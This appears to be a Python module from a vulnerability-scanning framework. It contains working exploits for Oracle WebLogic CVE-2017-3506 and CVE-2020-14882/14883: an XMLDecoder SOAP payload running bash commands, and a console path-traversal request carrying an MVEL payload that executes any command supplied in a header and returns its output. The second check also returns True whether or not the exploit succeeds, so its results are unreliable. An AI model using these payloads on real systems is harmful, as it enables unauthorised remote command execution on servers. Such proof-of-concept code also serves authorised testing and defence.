from SpiritCore.System import *


import requests
import urllib, re,socket
import http.client,time
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
from urllib.parse import urlparse

'''https://github.com/tr0uble-mAker/POC-bomber'''


class CVE20173506:
    URL=""
    def weblogic_fingerprint(self,url):  
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (str(host), int(port))
        sock.connect(server_address)
        sock.send(bytes.fromhex('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'))
        time.sleep(1)
        try:
            version = (re.findall(r'HELO:(.*?).false', sock.recv(1024).decode()))[0]
            if version:
                return True
            else:
                return False
        except:
            return False

    VUL=['CVE-2017-3506']
    headers = {'user-agent': 'ceshi/0.0.1'}

    def poc(self,u):
        url = "http://" + u
        url += '/wls-wsat/CoordinatorPortType'
        post_str = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
                <object class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                    <void index="0">
                    <string>/bin/bash</string>
                    </void>
                    <void index="1">
                    <string>-c</string>
                    </void>
                                    <void index="2">
                    <string>whoami</string>
                    </void>
                </array>
                <void method="start"/>
                </object>
            </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>
        '''

        try:
            response = requests.post(url, data=post_str, verify=False, timeout=5, headers=self.headers)
            response = response.text
            response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
        except Exception:
            response = ""

        if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
            return True
        else:
            return False

    
    def make(self,address,port):
        self.URL=  "%s:%s"%(address,port) 
    def run(self,rip,rport):
        url=rip+':'+str(rport)
        return self.poc(url)
    def verify(self):
        url = self.URL

        try:
            if self.weblogic_fingerprint(url) is not True:
                return False
            oH = urlparse(url)
            a = oH.netloc.split(':')
            port = 80
            if 2 == len(a):
                port = a[1]
            elif 'https' in oH.scheme:
                port = 443
            host = a[0]
            if self.run(host, port):
                return True
        except:
            return False

class CVE202014882:

    name = "Weblogic未授权远程命令执行漏洞(CVE-2020-14882&CVE-2020-14883)"
    URL=""
    def make(self,address,port):
        self.URL=  "http://%s:%s"%(address,port) 
    def verify(self):
        url=self.URL
        cmd = 'echo "excvasqweqqwqwaasasdasdasd"'
        path = "/console/css/%252e%252e%252fconsole.portal"
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,'
                    'application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cmd': cmd
        }
        payload = ('_nfpb=true&_pageLabel=&handle='
                'com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = '
                '(weblogic.work.ExecuteThread) Thread.currentThread(); weblogic.work.WorkAdapter adapter = '
                'executeThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField'
                '("connectionHandler"); field.setAccessible(true); Object obj = field.get(adapter); weblogic.servlet'
                '.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) '
                'obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd"); '
                'String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]'
                '{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd}; if (cmd != null) { String result '
                '= new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter'
                '("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.'
                'ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);'
                'res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));'
                'res.getServletOutputStream().flush(); res.getWriter().write(""); }executeThread.interrupt(); ");')
        try:
            vulurl = urllib.parse.urljoin(url, path)
            req = requests.post(vulurl, data=payload, headers=headers, timeout=5, verify=False)
            if re.search('excvasqweqqwqwaasasdasdasd', req.text) and re.search('echo', req.text) is not True:
                return True
            return True
        except:
            return False
